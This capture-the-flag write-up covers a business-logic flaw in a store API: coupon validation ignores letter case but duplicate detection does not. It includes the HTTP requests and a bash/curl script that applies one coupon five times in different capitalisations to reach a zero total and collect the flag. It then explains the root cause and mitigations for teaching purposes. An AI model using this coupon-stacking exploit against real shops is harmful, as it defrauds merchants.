# Challenge - Coupon Collector

> **Category:** Web / API Security  
> **Difficulty:** Easy  
> **Techniques:** Business Logic Vulnerability, Coupon Abuse, Case Sensitivity, API Testing

---

# Challenge Summary

The application exposes an online store API where users can add products to a shopping cart, apply discount coupons, and complete a checkout process.

The objective was to obtain the flag by purchasing an item through the API.

At first glance, the application appeared to prevent applying the same coupon multiple times. However, a flaw in the coupon validation logic made it possible to repeatedly apply the same discount using different uppercase/lowercase combinations.

---

# Enumeration

The first step was to enumerate the available products.

```http
GET /api/products
```

The response revealed several products. The most expensive one was:

| Product | ID | Price |
|---------|---:|------:|
| Mechanical Keyboard | 3 | 89.99 |

Since the checkout endpoint required the final price to be **0 or lower**, purchasing the most expensive item provided the best target for testing the discount system.

---

# Adding the Product

The product was added to the shopping cart using:

```http
POST /api/cart
Content-Type: application/json

{
    "product_id": 3
}
```

The cart now contained:

```
Mechanical Keyboard
Price: 89.99
```

---

# Testing the Coupon System

The API exposed an endpoint for applying coupons.

```http
POST /api/apply-coupon
```

Initially, the obvious coupon was tested.

```json
{
    "coupon": "WELCOME20"
}
```

The API correctly applied a **20% discount**.

Trying to apply it again returned an error indicating the coupon had already been used.

This suggested duplicate protection was implemented.

---

# Business Logic Analysis

Instead of using another coupon, different letter case combinations were tested.

The following values were accepted:

```text
WELCOME20
welcome20
Welcome20
WeLcOmE20
wELCOME20
```

Each request successfully applied another **20% discount**.

This behavior revealed an inconsistency between coupon validation and duplicate detection.

---

# Root Cause

The API validated coupon names **case-insensitively**, meaning every variation mapped to the same coupon.

However, duplicate detection compared the original strings **case-sensitively**.

Conceptually, the backend behaved like:

```text
Validation:
lower(coupon) == "welcome20"

Duplicate check:
coupon in appliedCoupons
```

Therefore:

```
WELCOME20
welcome20
Welcome20
WeLcOmE20
wELCOME20
```

were considered different values during duplicate detection even though they all represented the same coupon.

---

# Exploitation

Applying the coupon five times resulted in a cumulative discount of **100%**.

```
89.99
-20%
-20%
-20%
-20%
-20%

Final Total: 0.00
```

Once the cart total reached zero, the checkout endpoint accepted the purchase.

```http
POST /api/checkout
```

The server returned the flag.

---

# Exploit Script

```bash
#!/bin/bash

BASE='https://INSTANCE.chal.ctf.ae'
J='cookies.txt'

rm -f "$J"

echo "[+] Fetching products"
curl -sk -c "$J" -b "$J" "$BASE/api/products" | jq

echo "[+] Adding Mechanical Keyboard"
curl -sk -c "$J" -b "$J" \
  -H 'Content-Type: application/json' \
  -X POST "$BASE/api/cart" \
  --data '{"product_id":3}' | jq

for c in WELCOME20 welcome20 Welcome20 WeLcOmE20 wELCOME20
do
    echo "[+] Applying: $c"

    curl -sk -c "$J" -b "$J" \
      -H 'Content-Type: application/json' \
      -X POST "$BASE/api/apply-coupon" \
      --data "{\"coupon\":\"$c\"}" | jq
done

echo "[+] Checking cart"

curl -sk -c "$J" -b "$J" "$BASE/api/cart" | jq

echo "[+] Checkout"

curl -sk -c "$J" -b "$J" \
  -H 'Content-Type: application/json' \
  -X POST "$BASE/api/checkout" \
  --data '{}' | jq
```

---

# Vulnerability

**Business Logic Vulnerability**

The application implemented inconsistent normalization logic.

- Coupon validation was case-insensitive.
- Duplicate prevention was case-sensitive.

As a consequence, the same coupon could be redeemed multiple times simply by changing the capitalization.

This allowed an attacker to stack discounts beyond the intended limit.

---

# Impact

An attacker could:

- Apply the same coupon multiple times.
- Purchase products for free.
- Potentially receive money back if negative totals were accepted.
- Bypass business rules without exploiting memory corruption or authentication flaws.

This is a classic **Business Logic Vulnerability** where incorrect application logic leads to financial impact.

---

# Mitigation

The backend should normalize coupon values before both validation and storage.

For example:

```python
coupon = coupon.strip().lower()
```

Duplicate detection should then operate on the normalized value rather than the original user input.

Additionally:

- Store coupon identifiers instead of raw strings.
- Enforce a maximum number of coupon applications.
- Reject discounts exceeding the cart total.
- Validate business rules on the server side only.

---

# Lessons Learned

This challenge highlights that many real-world vulnerabilities arise from flawed business logic rather than traditional injection attacks.

Key takeaways include:

- Always test for inconsistent input normalization.
- Case sensitivity can introduce unexpected security issues.
- Business logic flaws often require understanding the application's intended workflow rather than searching for classic vulnerabilities.
- API testing should include variations in capitalization, encoding, and input formatting.

---

# Skills Demonstrated

- API Security Testing
- Business Logic Analysis
- HTTP Request Manipulation
- REST API Enumeration
- Exploit Development
- Bash Scripting
- OWASP API Security
- Secure Design Review

---
